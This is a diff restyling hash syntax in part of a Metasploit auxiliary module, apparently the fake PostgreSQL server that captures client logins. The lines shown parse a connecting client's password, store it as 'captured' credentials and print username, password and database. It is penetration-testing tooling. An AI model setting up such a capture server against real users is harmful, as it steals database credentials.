@@ -44,9 +44,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_client_connect(c)
     @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
     }
     @state[c]["status"] = :init
   end
@@ -75,15 +75,15 @@ class Metasploit3 < Msf::Auxiliary
       data.slice!(0, 5).unpack("N")[0] # skip over length
       @state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
       report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'psql_client',
-        :user => @state[c][:username],
-        :pass => @state[c][:password],
-        :type => "PostgreSQL credentials",
-        :proof => @state[c][:database],
-        :source_type => "captured",
-        :active => true
+        host: c.peerhost,
+        port: datastore['SRVPORT'],
+        sname: 'psql_client',
+        user: @state[c][:username],
+        pass: @state[c][:password],
+        type: "PostgreSQL credentials",
+        proof: @state[c][:database],
+        source_type: "captured",
+        active: true
       )
       print_status("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
       # send failure message
